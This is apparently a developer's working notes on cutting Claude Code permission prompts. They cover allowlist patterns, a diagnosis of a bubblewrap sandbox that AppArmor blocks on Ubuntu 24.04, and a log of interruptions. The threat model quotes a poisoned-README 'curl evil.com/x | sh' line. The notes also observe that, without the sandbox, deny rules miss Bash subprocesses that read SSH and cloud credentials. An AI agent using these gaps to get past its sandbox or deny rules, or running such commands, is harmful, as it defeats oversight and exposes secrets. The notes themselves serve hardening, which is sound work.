# Reducing Permission Prompts

How to cut "unsandboxed Bash" prompts in Claude Code without resorting to `--dangerously-skip-permissions`.

## Why prompts happen

The sandbox (configured in `.claude/settings.json` → `sandbox.enabled: true`) blocks:

- Network access (any host)
- Writes outside the current working directory
- Privileged ops

When Claude proposes a command that needs any of those, the harness escalates to an **unsandboxed** prompt. The "don't ask again" option only appears when the command matches a pattern in `permissions.allow` — free-form strings (varying ports, flags, pipes) won't match, so no shortcut is offered.

Example trigger:

```
sleep 25 && curl -s http://localhost:3002 | head -5
```

`curl` = network = sandbox denial → unsandboxed prompt. No allowlist match → no "don't ask again."

## Fix order

### 1. Pre-approve patterns in `.claude/settings.json`

Add canonical command shapes to `permissions.allow`. Patterns are glob-ish — wildcards expand within a single command token.

```jsonc
{
  "permissions": {
    "allow": [
      // Existing entries above…

      // Localhost dev servers
      "Bash(curl http://localhost:*)",
      "Bash(curl -s http://localhost:*)",
      "Bash(curl -sS http://localhost:*)",
      "Bash(curl -i http://localhost:*)",
      "Bash(curl http://127.0.0.1:*)",
      "Bash(curl -s http://127.0.0.1:*)",

      // Common dev-loop tools
      "Bash(sleep *)",
      "Bash(echo *)",
      "Bash(pnpm test*)",
      "Bash(pnpm build*)",
      "Bash(pnpm dlx *)",
      "Bash(node *)",
      "Bash(bun *)",
    ],
  },
}
```

Caveat: a `deny` entry overrides `allow`. The current `.claude/settings.json` does **not** deny `curl`, but if you add one, scope it (e.g. `Bash(curl http*://*)` minus the localhost allows above will not work — denies always win, so prefer narrow denies).

### 2. Use the `fewer-permission-prompts` skill

Scans your session transcripts, finds read-only Bash/MCP calls you've approved repeatedly, generates a prioritized allowlist patch to `.claude/settings.json`. Run after a few real sessions to catch real-world variants.

```
/fewer-permission-prompts
```

### 3. Loosen sandbox for localhost (if available)

Some versions support per-host network allowlisting in the `sandbox` block. Check your installed Claude Code version's settings schema. If supported, allow `localhost`/`127.0.0.1` so dev-server probes never trigger an unsandboxed prompt.

### 4. Standardize command shapes in `CLAUDE.md`

Fewer string variants = better allowlist hit rate. Add a note like:

> Always use `curl -sS http://localhost:PORT/path` for local probes (no `-v`, no `--silent`, no aliases).

## What NOT to do

- **`--dangerously-skip-permissions`** — defeats the threat model. The droplet's whole point is sandboxed dev for untrusted repos.
- **Blanket `Bash(*)` in `allow`** — same problem, less honest.
- **Adding `deny` for `curl:*` globally** — current settings don't do this, don't start. Curl to localhost is benign; curl to external hosts is what Tailscale-only + sandbox already constrain.

## Web access: route everything through Exa MCP

Single sanctioned egress channel = one auditable path, no domain-allowlist sprawl.

**Allow:**

```jsonc
"allow": [
  "mcp__exa__web_search_exa",
  "mcp__exa__web_fetch_exa"
]
```

**Deny built-in web tools:**

```jsonc
"deny": [
  "WebFetch",
  "WebSearch"
]
```

**Curl exceptions (path-scoped, no subdomain spoofing):**

```jsonc
"allow": [
  "Bash(curl -s https://raw.githubusercontent.com/*)",
  "Bash(curl -sS https://raw.githubusercontent.com/*)"
],
"ask": [
  "Bash(curl *github.com*)",
  "Bash(curl *raw.githubusercontent.com*)"
]
```

### Why

- `WebFetch(domain:github.com)` — github.com hosts attacker-controlled content (issues, PRs, gists). Matches the **Comment-and-Control** vector in the threat model.
- Bare `*` glob on `raw.githubusercontent.com*` matches `raw.githubusercontent.com.attacker.com`. Always use trailing `/*`.
- Exa MCP centralizes web access → one logging point for credential-exfil monitoring.

### Setup

1. Exa MCP defined in `.mcp.json` (already at user level via `install.sh` → `~/.claude/.mcp.json`).
2. Set `EXA_API_KEY` env var (currently a placeholder — see `CLAUDE.md` open list).
3. Remove Exa from `disabledMcpjsonServers` in `.claude/settings.local.json` once key is wired.

### Bash curl bypass

Denying `WebFetch` doesn't stop `Bash(curl ...)`. Other-domain curl falls through to the unsandboxed prompt — friction enough for the threat model. Don't add a blanket `Bash(curl:*)` deny; it'd block localhost probes too.

## References

- Project settings: `.claude/settings.json`
- Local overrides: `.claude/settings.local.json` (gitignored)
- Sandbox section: `.claude/settings.json` → `sandbox`
- Threat model: `CLAUDE.md` → "Threat model"
- Exa MCP config: `.mcp.json`

## Interruptions still encountered

Below is a list of examples of the multiple user prompts i'm getting during sessions.

### Primary cause: the sandbox can't start (bwrap netns failure)

Before tuning the allowlist, check whether the sandbox runs at all. On the
current droplet it does **not** — and that produces most of the prompts.

Symptom messages, all the same bug:

- "Sandbox blocked git. Retry."
- "Sandbox blocks bwrap. Retry without sandbox."
- "Sandbox blocked git (network namespace). Retry outside sandbox."
- "Sandbox network namespace issue with rg. Retry outside sandbox."

Reproduce:

```bash
bwrap --unshare-net --dev-bind / / true
# bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted
```

**Root cause — Ubuntu 24.04 AppArmor blocks unprivileged user namespaces.**
The visible loopback error is a symptom. The real block is one layer deeper:

```bash
sysctl kernel.apparmor_restrict_unprivileged_userns   # = 1  (24.04 default)
unshare --user --map-root-user true                   # uid_map: Operation not permitted
grep CapEff /proc/self/status                          # 0000…0000 — no effective caps
```

24.04 ships `kernel.apparmor_restrict_unprivileged_userns=1`, which forbids an
unconfined process from creating a user namespace with a uid map. bubblewrap's
sandbox _is_ a user namespace: it unshares userns, maps itself to root inside,
then unshares a net namespace and brings up `lo` via `RTM_NEWADDR` — which needs
`CAP_NET_ADMIN` that only exists once the userns root mapping succeeds. The
uid_map write is denied, so the chain fails at the first step and surfaces as
the loopback error. Claude Code's sandbox uses `--unshare-net` on every command,
so **every sandboxed command fails to start** and falls through to an
unsandboxed prompt.

This is why allowlisted commands still prompt: `git log:*`, `rg:*`, `jq:*` are
all already in `allow`, yet they prompt. The "don't ask again" shortcut only
appears after a _successful_ sandbox run — and the sandbox never succeeds here.
So the six allowlist causes below are real, but secondary; fix this first.

Ruled out: bubblewrap is current (upgrading does nothing), seccomp is off
(`Seccomp: 0`), the kernel allows userns in general
(`max_user_namespaces=31614`), and it's a bare KVM droplet
(`systemd-detect-virt=kvm`), not a nested container. The only blocker is the
AppArmor userns restriction.

#### Fix order for the sandbox

1. **Grant `userns` to bwrap with an AppArmor profile (official fix).** This is
   the exact remedy Anthropic's sandboxing docs ship for "Ubuntu 24.04 and
   later" ([code.claude.com/docs/en/sandboxing](https://code.claude.com/docs/en/sandboxing#set-up-linux-and-wsl2)).
   It keeps the global restriction on — every *other* unprivileged binary stays
   blocked — and grants the `userns` capability to `/usr/bin/bwrap` alone:

   ```bash
   sudo tee /etc/apparmor.d/bwrap > /dev/null <<'EOF'
   abi <abi/4.0>,
   include <tunables/global>

   profile bwrap /usr/bin/bwrap flags=(unconfined) {
     userns,
     include if exists <local/bwrap>
   }
   EOF
   sudo systemctl reload apparmor
   # verify — should print nothing and exit 0:
   bwrap --unshare-net --dev-bind / / true && echo "sandbox OK"
   ```

   The profile applies only to `bwrap` itself, not to the commands it runs
   inside the sandbox. Confirmed the droplet's bwrap is at `/usr/bin/bwrap`, so
   the hardcoded path matches. Requires the `apparmor` profile mechanism (24.04
   ships it). Once this passes, the sandbox starts and most prompts disappear.

   > Cruder alternative — global sysctl flip
   > (`kernel.apparmor_restrict_unprivileged_userns=0` in
   > `/etc/sysctl.d/60-userns.conf`). This re-allows unprivileged userns for
   > *every* binary, not just bwrap, widening the local-privilege-escalation
   > surface across the box. Only defensible because the droplet is
   > single-user with passwordless sudo + docker-group (root is already
   > trivially reachable, so userns LPE guards little). Prefer the scoped
   > profile above unless the AppArmor mechanism is unavailable.

2. **Install the optional seccomp helper** for Unix-domain-socket blocking
   (hardens against the `docker.sock` → host escalation path the docs call out):

   ```bash
   npm install -g @anthropic-ai/sandbox-runtime
   ```

   `bubblewrap` and `socat` (the two required packages) are already present.

3. **Bake steps 1–2 into provisioning** (`install.sh` / cloud-init) so every
   fresh droplet has a working sandbox from boot. Durable home for the fix —
   see `CLAUDE.md` → Next Steps.

4. **Fallback while the sandbox is broken — disable the sandbox per trusted
   repo.** A broken sandbox protects nothing: it fails open to a prompt you
   click through. In a repo you trust, drop the dead layer:

   ```jsonc
   // <project>/.claude/settings.local.json (gitignored)
   { "sandbox": { "enabled": false } }
   ```

   Keep the `deny` block and pre-tool hooks — those still fire (see the gap
   note below for what they do *not* catch). Do **not** disable the sandbox
   globally for untrusted-repo review: there it's the only thing containing a
   poisoned README running `node -e` / `pnpm dlx` / `npx` egress, so fixing
   bwrap (step 1) is the real requirement before any untrusted work.

> **Threat-model gap while the sandbox is down (verified against ToB
> `claude-code-config`):** *"Without `/sandbox`, deny rules only block Claude's
> built-in tools — Bash commands bypass them. With `/sandbox` enabled, the same
> rules are enforced at the OS level."* So our `deny` entries (`Bash(curl:*)`,
> `Read(**/.env*)`, etc.) and the `Read`-deny credential paths are **not**
> OS-enforced against Bash subprocesses without working bwrap — a subprocess can
> read `~/.ssh` / `~/.aws/credentials` (which the sandbox's *default* read policy
> also allows unless added to `denyRead`) and reach the network via `node`/`npx`.
> The pre-tool hooks (`rm -rf`, push-to-main) still fire because they inspect the
> command string before execution. Fixing bwrap closes the rest.
>
> Related hardening once the sandbox works: set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`
> to strip Anthropic/cloud creds from Bash subprocess env, and add `~/.ssh` /
> `~/.aws` to `sandbox.filesystem.denyRead` (the default read policy allows them).

### Allowlist causes & fixes

The prompts that remain after the sandbox works cluster into six causes. Each
has a distinct fix — allowlist alone won't catch all of them.

#### 1. Compound commands (`A && B`)

Allowlist patterns match a single command shape. `sleep 5 && curl -sS http://localhost:3000` is a compound — neither `Bash(sleep *)` nor `Bash(curl -sS http://localhost:*)` matches it as a unit.

Fix: add explicit compound shapes for recurring combinations.

```jsonc
"allow": [
  "Bash(sleep * && curl -sS http://localhost:*)",
  "Bash(sleep * && curl -s http://localhost:*)",
  "Bash(git log:* && git rev-parse:*)",
]
```

#### 2. Pipes (`A | B | C`)

Allowlist matches the first command; downstream pipe stages (`jq`, `head`, `awk`, `sort`) get re-checked.

Fix: allow common pipe-tail tools too.

```jsonc
"allow": [
  "Bash(jq:*)",
  "Bash(awk:*)",
  "Bash(sed:*)",
  "Bash(head:*)",
  "Bash(tail:*)",
  "Bash(sort:*)",
  "Bash(grep:*)",
  "Bash(rg:*)",
]
```

#### 3. Read-only git verbs blocked by sandbox

"Sandbox blocks git. Retry outside sandbox." appears for `git log`, `git show`, `git rev-parse`, `git rev-list`. These are read-only but the sandbox flags them because git can write to `.git/` (index lock, pack refresh).

Fix: allowlist read-only verbs explicitly.

```jsonc
"allow": [
  "Bash(git log:*)",
  "Bash(git show:*)",
  "Bash(git rev-parse:*)",
  "Bash(git rev-list:*)",
  "Bash(git diff:*)",
  "Bash(git blame:*)",
  "Bash(git status)",
  "Bash(git status:*)",
]
```

#### 4. Reads outside cwd

`awk ... ~/code/ma≥rumwelt/...` or `Read(~/.claude/plugins/cache/...)` — sandbox confines reads to the current working directory by default. Plugin/skill files live in `~/.claude/plugins/`, outside any project cwd.

Fix: add absolute-path Read globs to **user-level** `~/.claude/settings.json` (so they apply across projects).

```jsonc
"allow": [
  "Read(//home/<user>/.claude/plugins/**)",
  "Read(//home/<user>/.claude/skills/**)",
]
```

Note the leading `//` — Claude Code's permission system requires absolute paths to start with `//`, not `/`.

#### 5. Backslash-escaped paths

`~/code/<project>/prototype/Portfolio\ v3.html` — glob matching can't unescape backslashes. The same path with quotes (`"Portfolio v3.html"`) matches normally.

Fix: standardize in `CLAUDE.md` — always quote paths with spaces, never backslash-escape.

#### 6. Build commands writing outside cwd

"Sandbox blocks build. Retry without sandbox." — likely `pnpm build` writing to `~/.cache/`, `~/.pnpm-store/`, or similar. Not an allowlist problem; sandbox is correctly blocking writes outside cwd.

Fix options:

- Set `PNPM_HOME` / cache dirs inside the project (`.pnpm-store/`)
- Allow writes to specific external dirs in sandbox config (if your Claude Code version supports per-path write allowlisting)
- Accept the prompt for builds — they're infrequent

### Command shapes that avoid the prompt

The allowlist matches the literal command string of a single Bash call. The
biggest lever after fixing the sandbox is shaping commands so they match.

#### Run read-only git as separate tool calls, not one `&&` chain

This is the #1 source of the remaining prompts. A chained inspection command is
**one** Bash call whose literal string is `A && B && C` — no `allow` entry
matches it, even though each verb is allowlisted individually.

```
# One call — prompts (matches nothing):
git rev-parse HEAD && git status --short && git branch --show-current

# Three calls — each matches an allow entry, no prompt:
git rev-parse HEAD
git status --short
git branch --show-current
```

The agent can issue independent calls in parallel in a single turn, so
decomposing costs no round-trips. This is **agent behavior, not a setting** —
nothing in `settings.json` forces decomposition. Make it stick with a standing
instruction in `~/.claude/CLAUDE.md`:

> When inspecting git state, run read-only commands (`status`, `log`, `diff`,
> `rev-parse`, `branch --show-current`) as separate Bash calls. Never chain
> them with `&&` — the allowlist matches single commands, so chains always
> prompt. Reserve `&&` for ordering dependencies (e.g. `mkdir x && cd x`).

Allowlisting recurring combos instead is brittle — the set of `&&` combinations
is unbounded, so you'd chase each new one forever. Use the instruction as the
primary lever; allowlist at most 2–3 highest-frequency combos as a safety net.

#### Other shape rules

- **Paths with spaces:** quote them (`"Portfolio v3.html"`), never
  backslash-escape (cause #5).
- **Localhost probes:** one canonical form — `curl -sS http://localhost:PORT/path`,
  no `-v`, no aliases (matches the existing `allow` entries).

### Should I just disable the sandbox?

Tempting given the friction, but no — not as a default. The threat model (CLAUDE.md → "Threat model") is **prompt injection in untrusted repo content** issuing shell commands via the agent. Tailscale/UFW guard inbound; the sandbox guards agent-induced outbound execution. Disabling it removes the only layer that contains a poisoned README running `curl evil.com/x | sh`.

Defensible middle path: **per-project opt-out via `.claude/settings.local.json`** in trusted-only repos:

```jsonc
{ "sandbox": { "enabled": false } }
```

Keep sandbox on globally for the untrusted-repo-review use case. But note the
distinction from the **bwrap netns failure** above: there the sandbox is
_broken_ (fails open), so per-project disabling loses no security that's
actually being enforced. The order is: fix bwrap → sandbox works → keep it on
for untrusted work and lean on command shapes + allowlist for friction. Only
disable per-project, and only while bwrap is unfixed or the repo is trusted.

### Interruptions recorded

Bash

```
 git show ec84082:package.json | jq '.devDependencies | to_entries[] | select(.key | test("vitest|@vitejs/plugin-react|@testing-library/react|@testing-library/jest-dom|@testing-library/user-event|jsdom")) | "\(.key): \(.value)"'
```

`git show d705666:package.json | jq '.devDependencies.oxlint'`

---

Read

```
~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/spec-reviewer-prompt.md
```

---

Sandbox blocks git. Retry outside sandbox.

---

Bash command (unsandboxed)
`git log --oneline -n 2 && git rev-parse e6e79af^`

---

Bash command (unsandboxed)

```
awk 'length > 100 {print FILENAME ":" NR ": " length " chars: " $0}' ~/code/<project>/components/nav/FixedNav.tsx ~/code/<project>/app/layout.tsx
```

---

Bash
`sleep 5 && curl -sS http://localhost:3000 | head -50`

---

```
Read(~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/code-quality-reviewer-prompt.md)
```

2. Yes, allow reading from subagent-driven-development/ during this session

---

Sandbox blocks build. Retry without sandbox.

---

`git rev-list -n 1 v0.1.0-foundation && git log -1 --oneline v0.1.0-foundation^`

---

Bash

```
find . -type f \( -name "*.md" -o -name "package.json" \) ! -path "*/node_modules/*" ! -path "*/archive/*" | sort
Run shell command
```

---

Bash

```
grep -i "d-fast\|d-base\|d-slow" ~/code/<project>/prototype/Portfolio\ v3.html 2>/dev/null | head -5
Run shell command
```

Contains backslash-escaped whitespace

---

```
Read(~/.claude/plugins/cache/claude-plugins-official/superpowers/5.1.0/skills/subagent-driven-development/implementer-prompt.md)
```

2.  Yes, allow reading from subagent-driven-development/ during this session

---

Bash

```
test -f .env.local && echo "env exists" || echo "MISSING"; git status --short && git log --oneline main..HEAD
```

### New interruptions recorded

sandbox blocked this:

Bash(git rev-parse HEAD && git status --short && git branch --show-current)

Sandbox blocked git. Retry.

● Bash(git rev-parse HEAD && git status --short && git branch --show-current)
4ae38934d8dc32eb5cabd2e072607ec5864c66fb
contentful

Sandbox blocks bwrap. Retry without sandbox.

● Bash(git log --oneline -1 && git status)
b402ad4 chore: add allow permission in settings.json
On branch contentful
Your branch is up to date with 'origin/contentful'.

Sandbox blocked git (network namespace). Retry outside sandbox.

● Bash(git status --short && echo "---BRANCH---" && git branch --show-current)
---BRANCH---
main

Bash command (unsandboxed)

echo "=== find compiled css in .next ===" && fd -e css . .next 2>/dev/null | head; echo "=== grep bg-fg/text-fg in any built css ===" ; rg -l "\.bg-fg|\.text-fg" .next 2>/dev/null | head; echo "=== does .next exist? ===" ; ls -la .next 2>/dev/null | head -3 || echo "no .next (dev server may use memory)"
Look for compiled Tailwind CSS with bg-fg

Bash command (unsandboxed)

ss -ltnp 2>/dev/null | rg -o ':(3000|3001|3002)\b' | head; echo "---"; rg -o '"dev":\s*"[^"]*"' package.json
Find dev server port

Bash command (unsandboxed)

cat <<'EOF' | agent-browser eval --stdin --json
(() => {
const dot = document.querySelector('button[aria-label^="Switch to"]');
// Walk matched CSS rules to find which set background
const out = [];
for (const sheet of document.styleSheets) {
let rules;
try { rules = sheet.cssRules; } catch { continue; }
for (const rule of rules) {
if (rule.selectorText && /background/.test(rule.cssText)) {
try {
if (dot.matches(rule.selectorText)) {
out.push({ sel: rule.selectorText, css: rule.cssText.slice(0,120) });
}
} catch {}
}
}
}
return out;
})()
EOF
Find all background rules matching the dot

Contains brace with quote character (expansion obfuscation

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Bash command (unsandboxed)

echo "=== react-obfuscate ==="; npm view react-obfuscate version time.modified dependencies peerDependencies 2>&1; echo "=== react-mailto-obfuscate ==="; npm view react-mailto-obfuscate version time.modified dependencies peerDependencies 2>&1
Check npm versions for obfuscation candidates

Do you want to proceed?
❯ 1. Yes

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Bash command (unsandboxed)

echo "=== meta ==="; npm view react-obfuscate-email dependencies peerDependencies repository.url description 2>&1; echo "=== tarball files ==="; npm view react-obfuscate-email dist.tarball 2>&1
Inspect react-obfuscate-email deps and repo

Do you want to proceed?
❯ 1. Yes

Bash(rg -n "email|externalLinks|SocialLink|label|url" lib/contentful/schemas.ts | head -40)

● Bash(rg -n "nav|header|footer|Projects|About|Imprint|marum|Berlin|class=" prototype/portfolio-v3.html | head -60)

Sandbox network namespace issue with rg. Retry outside sandbox.

● Update(app/layout.tsx)
Error: PreToolUse:Edit hook error: [python3 ${CLAUDE_PLUGIN_ROOT}/hooks/security_reminder_hook.py]: ⚠️ Security Warning: dangerouslySetInnerHTML can lead to XSS vulnerabilities if used with untrusted content. Ensure all content is properly sanitized using an HTML sanitizer library like DOMPurify, or use safe alternatives.
Found 2 new diagnostic issues in 1 file (ctrl+o to expand)

───────────────────────────────────────────────────────────────────────────────────────────────────────────────
Bash command (unsandboxed)

date +%Y-%m-%d && ls docs/superpowers/specs/ 2>/dev/null || echo "specs dir missing"
Get date and check specs dir

Sandbox network block. Retry disabled sandbox.

● Bash(git log --oneline -3 && echo "---STATUS---" && git status --short && echo "---NAV FILES---" && ls components/nav/ && echo "---LANDING---" && ls components/landing/)
322f295 docs: implementation plan for home finalization
929d0b8 docs: spec for home finalization (nav, sound, hero, renames)
6f377c2 docs: add deferred points spec
---STATUS---
---NAV FILES---
EmailLink.test.tsx

─────────────────────────────────────────────────────────────────────────────────────────────
Bash command (unsandboxed)

git mv components/nav/PageFooter.tsx components/nav/Footer.tsx && git mv components/nav/PageFooter.test.tsx components/nav/Footer.test.tsx
Rename PageFooter files via git mv

---

---

---

Bash command

cat -n components/landing/LandingHero.tsx 2>/dev/null || find . -name "LandingHero\*" -exec cat -n {} \;
Read LandingHero to understand how HeroFixedElements integrates

find with '-exec' executes commands or modifies files — cannot be auto-allowed by a Bash(find:\*) prefix rule

Do you want to proceed?

### Settings

Current settings to audit

`~/.claude/settings.json`
`~/.claude/settings.local.json`

and in the specific project i'm working in
`~/code/<project>/.claude/settings.json`
`~/code/<project>/.claude/settings.local.json`

